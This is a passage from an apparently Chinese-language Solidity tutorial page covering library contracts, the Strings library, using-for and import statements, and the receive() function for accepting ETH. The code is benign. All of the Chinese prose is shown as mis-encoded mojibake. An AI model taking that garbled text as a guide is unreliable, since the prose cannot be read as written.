class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line"></span><br><span class="line">library Strings &#123;</span><br><span class="line">    bytes16 private constant _HEX_SYMBOLS = &quot;0123456789abcdef&quot;;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Converts a `uint256` to its ASCII `string` decimal representation.</span><br><span class="line">     */</span><br><span class="line">    function toString(uint256 value) public pure returns (string memory) &#123;</span><br><span class="line">        // Inspired by OraclizeAPI&#x27;s implementation - MIT licence</span><br><span class="line">        // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol</span><br><span class="line"></span><br><span class="line">        if (value == 0) &#123;</span><br><span class="line">            return &quot;0&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        uint256 temp = value;</span><br><span class="line">        uint256 digits;</span><br><span class="line">        while (temp != 0) &#123;</span><br><span class="line">            digits++;</span><br><span class="line">            temp /= 10;</span><br><span class="line">        &#125;</span><br><span class="line">        bytes memory buffer = new bytes(digits);</span><br><span class="line">        while (value != 0) &#123;</span><br><span class="line">            digits -= 1;</span><br><span class="line">            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));</span><br><span class="line">            value /= 10;</span><br><span class="line">        &#125;</span><br><span class="line">        return string(buffer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.</span><br><span class="line">     */</span><br><span class="line">    function toHexString(uint256 value) public pure returns (string memory) &#123;</span><br><span class="line">        if (value == 0) &#123;</span><br><span class="line">            return &quot;0x00&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        uint256 temp = value;</span><br><span class="line">        uint256 length = 0;</span><br><span class="line">        while (temp != 0) &#123;</span><br><span class="line">            length++;</span><br><span class="line">            temp &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">        return toHexString(value, length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.</span><br><span class="line">     */</span><br><span class="line">    function toHexString(uint256 value, uint256 length) public pure returns (string memory) &#123;</span><br><span class="line">        bytes memory buffer = new bytes(2 * length + 2);</span><br><span class="line">        buffer[0] = &quot;0&quot;;</span><br><span class="line">        buffer[1] = &quot;x&quot;;</span><br><span class="line">        for (uint256 i = 2 * length + 1; i &gt; 1; --i) &#123;</span><br><span class="line">            buffer[i] = _HEX_SYMBOLS[value &amp; 0xf];</span><br><span class="line">            value &gt;&gt;= 4;</span><br><span class="line">        &#125;</span><br><span class="line">        require(value == 0, &quot;Strings: hex length insufficient&quot;);</span><br><span class="line">        return string(buffer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// ç”¨å‡½æ•°è°ƒç”¨å¦ä¸€ä¸ªåº“åˆçº¦</span><br><span class="line">contract UseLibrary&#123;    </span><br><span class="line">    // åˆ©ç”¨using foræ“ä½œä½¿ç”¨åº“</span><br><span class="line">    using Strings for uint256;</span><br><span class="line">    function getString1(uint256 _number) public pure returns(string memory)&#123;</span><br><span class="line">        // åº“å‡½æ•°ä¼šè‡ªåŠ¨æ·»åŠ ä¸ºuint256å‹å˜é‡çš„æˆå‘˜</span><br><span class="line">        return _number.toHexString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // ç›´æ¥é€šè¿‡åº“åˆçº¦åè°ƒç”¨</span><br><span class="line">    function getString2(uint256 _number) public pure returns(string memory)&#123;</span><br><span class="line">        return Strings.toHexString(_number);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åº“åˆçº¦-2">åº“åˆçº¦</h3><p>åº“åˆçº¦æ˜¯ä¸€ç§ç‰¹æ®Šçš„åˆçº¦ï¼Œä¸ºäº†æå‡<code>Solidity</code>ä»£ç çš„å¤ç”¨æ€§å’Œå‡å°‘<code>gas</code>è€Œå­˜åœ¨ã€‚åº“åˆçº¦æ˜¯ä¸€ç³»åˆ—çš„å‡½æ•°åˆé›†ï¼Œç”±å¤§ç¥æˆ–è€…é¡¹ç›®æ–¹åˆ›ä½œï¼Œå’±ä»¬ç«™åœ¨å·¨äººçš„è‚©è†€ä¸Šï¼Œä¼šç”¨å°±è¡Œäº†ã€‚</p><p>ä»–å’Œæ™®é€šåˆçº¦ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç‚¹ä¸åŒï¼š</p><ol><li>ä¸èƒ½å­˜åœ¨çŠ¶æ€å˜é‡</li><li>ä¸èƒ½å¤Ÿç»§æ‰¿æˆ–è¢«ç»§æ‰¿</li><li>ä¸èƒ½æ¥æ”¶ä»¥å¤ªå¸</li><li>ä¸å¯ä»¥è¢«é”€æ¯</li></ol><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåº“åˆçº¦ä¸­çš„å‡½æ•°å¯è§æ€§å¦‚æœè¢«è®¾ç½®ä¸º<code>public</code>æˆ–è€…<code>external</code>ï¼Œåˆ™åœ¨è°ƒç”¨å‡½æ•°æ—¶ä¼šè§¦å‘ä¸€æ¬¡<code>delegatecall</code>ã€‚è€Œå¦‚æœè¢«è®¾ç½®ä¸º<code>internal</code>ï¼Œåˆ™ä¸ä¼šå¼•èµ·ã€‚å¯¹äºè®¾ç½®ä¸º<code>private</code>å¯è§æ€§çš„å‡½æ•°æ¥è¯´ï¼Œå…¶ä»…èƒ½åœ¨åº“åˆçº¦ä¸­å¯è§ï¼Œåœ¨å…¶ä»–åˆçº¦ä¸­ä¸å¯ç”¨ã€‚</p><h3 id="Stringsåº“åˆçº¦">Stringsåº“åˆçº¦</h3><p><code>Stringsåº“åˆçº¦</code>æ˜¯å°†<code>uint256</code>ç±»å‹è½¬æ¢ä¸ºç›¸åº”çš„<code>string</code>ç±»å‹çš„ä»£ç åº“ï¼Œæ ·ä¾‹ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">library Strings &#123;</span><br><span class="line">    bytes16 private constant _HEX_SYMBOLS = &quot;0123456789abcdef&quot;;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Converts a `uint256` to its ASCII `string` decimal representation.</span><br><span class="line">     */</span><br><span class="line">    function toString(uint256 value) public pure returns (string memory) &#123;</span><br><span class="line">        // Inspired by OraclizeAPI&#x27;s implementation - MIT licence</span><br><span class="line">        // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol</span><br><span class="line"></span><br><span class="line">        if (value == 0) &#123;</span><br><span class="line">            return &quot;0&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        uint256 temp = value;</span><br><span class="line">        uint256 digits;</span><br><span class="line">        while (temp != 0) &#123;</span><br><span class="line">            digits++;</span><br><span class="line">            temp /= 10;</span><br><span class="line">        &#125;</span><br><span class="line">        bytes memory buffer = new bytes(digits);</span><br><span class="line">        while (value != 0) &#123;</span><br><span class="line">            digits -= 1;</span><br><span class="line">            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));</span><br><span class="line">            value /= 10;</span><br><span class="line">        &#125;</span><br><span class="line">        return string(buffer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.</span><br><span class="line">     */</span><br><span class="line">    function toHexString(uint256 value) public pure returns (string memory) &#123;</span><br><span class="line">        if (value == 0) &#123;</span><br><span class="line">            return &quot;0x00&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        uint256 temp = value;</span><br><span class="line">        uint256 length = 0;</span><br><span class="line">        while (temp != 0) &#123;</span><br><span class="line">            length++;</span><br><span class="line">            temp &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">        return toHexString(value, length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.</span><br><span class="line">     */</span><br><span class="line">    function toHexString(uint256 value, uint256 length) public pure returns (string memory) &#123;</span><br><span class="line">        bytes memory buffer = new bytes(2 * length + 2);</span><br><span class="line">        buffer[0] = &quot;0&quot;;</span><br><span class="line">        buffer[1] = &quot;x&quot;;</span><br><span class="line">        for (uint256 i = 2 * length + 1; i &gt; 1; --i) &#123;</span><br><span class="line">            buffer[i] = _HEX_SYMBOLS[value &amp; 0xf];</span><br><span class="line">            value &gt;&gt;= 4;</span><br><span class="line">        &#125;</span><br><span class="line">        require(value == 0, &quot;Strings: hex length insufficient&quot;);</span><br><span class="line">        return string(buffer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®ƒä¸»è¦åŒ…å«ä¸¤ä¸ªå‡½æ•°ï¼Œ<code>toString()</code>å°†<code>uint256</code>è½¬æ¢ä¸º10è¿›åˆ¶çš„<code>string</code>ï¼Œ<code>toHexString()</code>å°†<code>uint256</code>è½¬æ¢ä¸º16è¿›åˆ¶çš„<code>string</code>ã€‚</p><h3 id="å¦‚ä½•ä½¿ç”¨åº“åˆçº¦ï¼Ÿ">å¦‚ä½•ä½¿ç”¨åº“åˆçº¦ï¼Ÿ</h3><p>æˆ‘ä»¬ç”¨<code>Strings</code>åº“åˆçº¦çš„<code>toHexString()</code>æ¥æ¼”ç¤ºä¸¤ç§ä½¿ç”¨åº“åˆçº¦ä¸­å‡½æ•°çš„åŠæ³•ã€‚</p><ul><li>åˆ©ç”¨using foræŒ‡ä»¤ï¼ŒæŒ‡ä»¤<code>using A for B;</code>å¯ç”¨äºé™„åŠ åº“åˆçº¦ï¼ˆä»åº“<code> A</code>ï¼‰åˆ°ä»»ä½•ç±»å‹ï¼ˆ<code>B</code>ï¼‰ã€‚æ·»åŠ å®ŒæŒ‡ä»¤åï¼Œåº“<code>A</code>ä¸­çš„å‡½æ•°ä¼šè‡ªåŠ¨æ·»åŠ ä¸º<code>B</code>ç±»å‹å˜é‡çš„æˆå‘˜ï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨ã€‚æ³¨æ„ï¼šåœ¨è°ƒç”¨çš„æ—¶å€™ï¼Œè¿™ä¸ªå˜é‡ä¼šè¢«å½“ä½œç¬¬ä¸€ä¸ªå‚æ•°ä¼ é€’ç»™å‡½æ•°ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// åˆ©ç”¨using foræŒ‡ä»¤</span><br><span class="line">using Strings for uint256;</span><br><span class="line">function getString1(uint256 _number) public pure returns(string memory)&#123;</span><br><span class="line">    // åº“åˆçº¦ä¸­çš„å‡½æ•°ä¼šè‡ªåŠ¨æ·»åŠ ä¸ºuint256å‹å˜é‡çš„æˆå‘˜</span><br><span class="line">    return _number.toHexString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>é€šè¿‡åº“åˆçº¦åç§°è°ƒç”¨å‡½æ•°</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// ç›´æ¥é€šè¿‡åº“åˆçº¦åè°ƒç”¨</span><br><span class="line">function getString2(uint256 _number) public pure returns(string memory)&#123;</span><br><span class="line">    return Strings.toHexString(_number);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬éƒ¨ç½²åˆçº¦å¹¶è¾“å…¥<code>130</code>æµ‹è¯•ä¸€ä¸‹ï¼Œä¸¤ç§æ–¹æ³•å‡èƒ½è¿”å›æ­£ç¡®çš„16è¿›åˆ¶string <code>0x82</code>ã€‚è¯æ˜æˆ‘ä»¬è°ƒç”¨åº“åˆçº¦æˆåŠŸï¼</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204035623180.png" alt="image-20250204035623180"></p><p>å¸¸è§çš„åº“åˆçº¦æœ‰ï¼š</p><ol><li><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4a9cc8b4918ef3736229a5cc5a310bdc17bf759f/contracts/utils/Strings.sol">Strings</a>ï¼šå°†<code>uint256</code>è½¬æ¢ä¸º<code>String</code></li><li><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4a9cc8b4918ef3736229a5cc5a310bdc17bf759f/contracts/utils/Address.sol">Address</a>ï¼šåˆ¤æ–­æŸä¸ªåœ°å€æ˜¯å¦ä¸ºåˆçº¦åœ°å€</li><li><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4a9cc8b4918ef3736229a5cc5a310bdc17bf759f/contracts/utils/Create2.sol">Create2</a>ï¼šæ›´å®‰å…¨çš„ä½¿ç”¨<code>Create2 EVM opcode</code></li><li><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4a9cc8b4918ef3736229a5cc5a310bdc17bf759f/contracts/utils/Arrays.sol">Arrays</a>ï¼šè·Ÿæ•°ç»„ç›¸å…³çš„åº“åˆçº¦</li></ol><h2 id="Import">Import</h2><p>åœ¨Solidityä¸­ï¼Œ<code>import</code>è¯­å¥å¯ä»¥å¸®åŠ©æˆ‘ä»¬åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­å¼•ç”¨å¦ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹ï¼Œæé«˜ä»£ç çš„å¯é‡ç”¨æ€§å’Œç»„ç»‡æ€§ã€‚æœ¬æ•™ç¨‹å°†å‘ä½ ä»‹ç»å¦‚ä½•åœ¨Solidityä¸­ä½¿ç”¨<code>import</code>è¯­å¥ã€‚</p><h3 id="Importç”¨æ³•"><code>Import</code>ç”¨æ³•</h3><ul><li>é€šè¿‡æºæ–‡ä»¶ç›¸å¯¹ä½ç½®å¯¼å…¥ï¼Œä¾‹å­ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">æ–‡ä»¶ç»“æ„</span><br><span class="line">â”œâ”€â”€ Import.sol</span><br><span class="line">â””â”€â”€ Yeye.sol</span><br><span class="line"></span><br><span class="line">// é€šè¿‡æ–‡ä»¶ç›¸å¯¹ä½ç½®import</span><br><span class="line">import &#x27;./Yeye.sol&#x27;;</span><br></pre></td></tr></table></figure><ul><li>é€šè¿‡æºæ–‡ä»¶ç½‘å€å¯¼å…¥ç½‘ä¸Šçš„åˆçº¦çš„å…¨å±€ç¬¦å·ï¼Œä¾‹å­ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// é€šè¿‡ç½‘å€å¼•ç”¨</span><br><span class="line">import &#x27;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol&#x27;;</span><br></pre></td></tr></table></figure><ul><li>é€šè¿‡<code>npm</code>çš„ç›®å½•å¯¼å…¥ï¼Œä¾‹å­ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import &#x27;@openzeppelin/contracts/access/Ownable.sol&#x27;;</span><br></pre></td></tr></table></figure><ul><li>é€šè¿‡æŒ‡å®š<code>å…¨å±€ç¬¦å·</code>å¯¼å…¥åˆçº¦ç‰¹å®šçš„å…¨å±€ç¬¦å·ï¼Œä¾‹å­ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import &#123;Yeye&#125; from &#x27;./Yeye.sol&#x27;;</span><br></pre></td></tr></table></figure><ul><li>å¼•ç”¨(<code>import</code>)åœ¨ä»£ç ä¸­çš„ä½ç½®ä¸ºï¼šåœ¨å£°æ˜ç‰ˆæœ¬å·ä¹‹åï¼Œåœ¨å…¶ä½™ä»£ç ä¹‹å‰ã€‚</li></ul><h3 id="æµ‹è¯•å¯¼å…¥ç»“æœ">æµ‹è¯•å¯¼å…¥ç»“æœ</h3><p>æˆ‘ä»¬å¯ä»¥ç”¨ä¸‹é¢è¿™æ®µä»£ç æµ‹è¯•æ˜¯å¦æˆåŠŸå¯¼å…¥äº†å¤–éƒ¨æºä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line"></span><br><span class="line">// é€šè¿‡æ–‡ä»¶ç›¸å¯¹ä½ç½®import</span><br><span class="line">import &#x27;./Yeye.sol&#x27;;</span><br><span class="line">// é€šè¿‡`å…¨å±€ç¬¦å·`å¯¼å…¥ç‰¹å®šçš„åˆçº¦</span><br><span class="line">import &#123;Yeye&#125; from &#x27;./Yeye.sol&#x27;;</span><br><span class="line">// é€šè¿‡ç½‘å€å¼•ç”¨</span><br><span class="line">import &#x27;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol&#x27;;</span><br><span class="line">// å¼•ç”¨OpenZeppelinåˆçº¦</span><br><span class="line">import &#x27;@openzeppelin/contracts/access/Ownable.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Import &#123;</span><br><span class="line">    // æˆåŠŸå¯¼å…¥Addressåº“</span><br><span class="line">    using Address for address;</span><br><span class="line">    // å£°æ˜yeyeå˜é‡</span><br><span class="line">    Yeye yeye = new Yeye();</span><br><span class="line"></span><br><span class="line">    // æµ‹è¯•æ˜¯å¦èƒ½è°ƒç”¨yeyeçš„å‡½æ•°</span><br><span class="line">    function test() external&#123;</span><br><span class="line">        yeye.hip();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Yeye.sol</code>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line"></span><br><span class="line">// ç¬¬10è®²åˆçº¦ç»§æ‰¿ä¸­çš„Yeyeåˆçº¦</span><br><span class="line">contract Yeye &#123;</span><br><span class="line">    event Log(string msg);</span><br><span class="line"></span><br><span class="line">    // å®šä¹‰3ä¸ªfunction: hip(), pop(), yeye()ï¼ŒLogå€¼ä¸ºYeyeã€‚</span><br><span class="line">    function hip() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Yeye hip&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pop() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Yeye pop&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function yeye() public virtual &#123;</span><br><span class="line">        emit Log(&quot;Yeye&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æµ‹è¯•ç»“æœå¦‚ä¸‹ï¼š</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204041504259.png" alt="image-20250204041504259"></p><h2 id="æ¥æ”¶å’Œå‘é€ETH">æ¥æ”¶å’Œå‘é€ETH</h2><p>æœ¬è®²ä¸»è¦ä»‹ç»ETHçš„æ¥æ”¶å’Œå‘é€ã€‚</p><h3 id="æ¥æ”¶ETH">æ¥æ”¶ETH</h3><p><code>Solidity</code>æ”¯æŒä¸¤ç§ç‰¹æ®Šçš„å›è°ƒå‡½æ•°ï¼Œ<code>receive()</code>å’Œ<code>fallback()</code>ï¼Œä»–ä»¬ä¸»è¦åœ¨ä¸¤ç§æƒ…å†µä¸‹è¢«ä½¿ç”¨ï¼š</p><ul><li>æ¥æ”¶ETH</li><li>å¤„ç†åˆçº¦ä¸­ä¸å­˜åœ¨çš„å‡½æ•°è°ƒç”¨ï¼ˆä»£ç†åˆçº¦proxy contractï¼‰</li></ul><p><strong>æ³¨æ„âš ï¸</strong>ï¼šåœ¨Solidity 0.6.xç‰ˆæœ¬ä¹‹å‰ï¼Œè¯­æ³•ä¸Šåªæœ‰ <code>fallback()</code> å‡½æ•°ï¼Œç”¨æ¥æ¥æ”¶ç”¨æˆ·å‘é€çš„ETHæ—¶è°ƒç”¨ä»¥åŠåœ¨è¢«è°ƒç”¨å‡½æ•°ç­¾åæ²¡æœ‰åŒ¹é…åˆ°æ—¶ï¼Œæ¥è°ƒç”¨ã€‚ 0.6ç‰ˆæœ¬ä¹‹åï¼ŒSoliditæ‰å°† <code>fallback()</code> å‡½æ•°æ‹†åˆ†æˆ <code>receive()</code> å’Œ <code>fallback()</code> ä¸¤ä¸ªå‡½æ•°ã€‚</p><h4 id="æ¥æ”¶ETHå‡½æ•°receive">æ¥æ”¶ETHå‡½æ•°<code>receive</code></h4><p><code>receive()</code>å‡½æ•°æ˜¯åœ¨åˆçº¦æ”¶åˆ°<code>ETH</code>è½¬è´¦æ—¶è¢«è°ƒç”¨çš„å‡½æ•°ã€‚</p><p>ä¸€ä¸ªåˆçº¦æœ€å¤šæœ‰ä¸€ä¸ª<code>receive()</code>å‡½æ•°ï¼Œå£°æ˜æ–¹å¼ä¸ä¸€èˆ¬å‡½æ•°ä¸ä¸€æ ·ï¼Œä¸éœ€è¦<code>function</code>å…³é”®å­—ï¼š<code>receive() external payable &#123; ... &#125;</code>ã€‚<code>receive()</code>å‡½æ•°ä¸èƒ½æœ‰ä»»ä½•çš„å‚æ•°ï¼Œä¸èƒ½è¿”å›ä»»ä½•å€¼ï¼Œ<strong>å¿…é¡»åŒ…å«<code>external</code>å’Œ<code>payable</code>ã€‚</strong></p><p>å½“åˆçº¦æ¥æ”¶ETHçš„æ—¶å€™ï¼Œ<code>receive()</code>ä¼šè¢«è§¦å‘ã€‚<code>receive()</code>æœ€å¥½ä¸è¦æ‰§è¡Œå¤ªå¤šçš„é€»è¾‘å› ä¸ºå¦‚æœåˆ«äººç”¨<code>send</code>å’Œ<code>transfer</code>æ–¹æ³•å‘é€<code>ETH</code>çš„è¯ï¼Œ<code>gas</code>ä¼šé™åˆ¶åœ¨<code>2300</code>ï¼Œ<code>receive()</code>å¤ªå¤æ‚å¯èƒ½ä¼šè§¦å‘<code>Out of Gas</code>æŠ¥é”™ï¼›å¦‚æœç”¨<code>call</code>å°±å¯ä»¥è‡ªå®šä¹‰<code>gas</code>æ‰§è¡Œæ›´å¤æ‚çš„é€»è¾‘ï¼ˆè¿™ä¸‰ç§å‘é€ETHçš„æ–¹æ³•æˆ‘ä»¬ä¹‹åä¼šè®²åˆ°ï¼‰ã€‚</p><p>æˆ‘ä»¬å¯ä»¥åœ¨<code>receive()</code>é‡Œå‘é€ä¸€ä¸ª<code>event</code>ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// å®šä¹‰äº‹ä»¶</span><br><span class="line">event Received(address Sender, uint Value);</span><br><span class="line">// æ¥æ”¶ETHæ—¶é‡Šæ”¾Receivedäº‹ä»¶</span><br><span class="line">receive() external payable &#123;</span><br><span class="line">    emit Received(msg.sender, msg.value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ‰äº›æ¶æ„åˆçº¦ï¼Œä¼šåœ¨<code>receive()</code> å‡½æ•°ï¼ˆè€ç‰ˆæœ¬çš„è¯ï¼Œå°±æ˜¯ <code>fallback()</code> å‡½æ•°ï¼‰åµŒå…¥æ¶æ„æ¶ˆè€—<code>gas</code>çš„å†…å®¹æˆ–è€…ä½¿å¾—æ‰§è¡Œæ•…æ„å¤±è´¥çš„ä»£ç ï¼Œå¯¼è‡´ä¸€äº›åŒ…å«é€€æ¬¾å’Œè½¬è´¦é€»è¾‘çš„åˆçº¦ä¸èƒ½æ­£å¸¸å·¥ä½œï¼Œå› æ­¤å†™åŒ…å«é€€æ¬¾ç­‰é€»è¾‘çš„åˆçº¦æ—¶å€™ï¼Œä¸€å®šè¦æ³¨æ„è¿™ç§æƒ…å†µã€‚</p><h4 id="å›é€€ETHå‡½æ•°fallback">å›é€€ETHå‡½æ•°<code>fallback</code></h4><p><code>fallback()</code>å‡½æ•°ä¼šåœ¨è°ƒç”¨åˆçº¦ä¸å­˜åœ¨çš„å‡½æ•°æ—¶è¢«è§¦å‘ã€‚å¯ç”¨äºæ¥æ”¶ETHï¼Œä¹Ÿå¯ä»¥ç”¨äºä»£ç†åˆçº¦<code>proxy contract</code>ã€‚</p><p><code>fallback()</code>å£°æ˜æ—¶ä¸éœ€è¦<code>function</code>å…³é”®å­—ï¼Œ<strong>å¿…é¡»ç”±<code>external</code>ä¿®é¥°ï¼Œä¸€èˆ¬ä¹Ÿä¼šç”¨<code>payable</code>ä¿®é¥°</strong>ï¼Œç”¨äºæ¥æ”¶ETH:<code>fallback() external payable &#123; ... &#125;</code>ã€‚</p><p>æˆ‘ä»¬å®šä¹‰ä¸€ä¸ª<code>fallback()</code>å‡½æ•°ï¼Œè¢«è§¦å‘æ—¶å€™ä¼šé‡Šæ”¾<code>fallbackCalled</code>äº‹ä»¶ï¼Œå¹¶è¾“å‡º<code>msg.sender</code>ï¼Œ<code>msg.value</code>å’Œ<code>msg.data</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">event fallbackCalled(address Sender, uint Value, bytes Data);</span><br><span class="line"></span><br><span class="line">// fallback</span><br><span class="line">fallback() external payable&#123;</span><br><span class="line">    emit 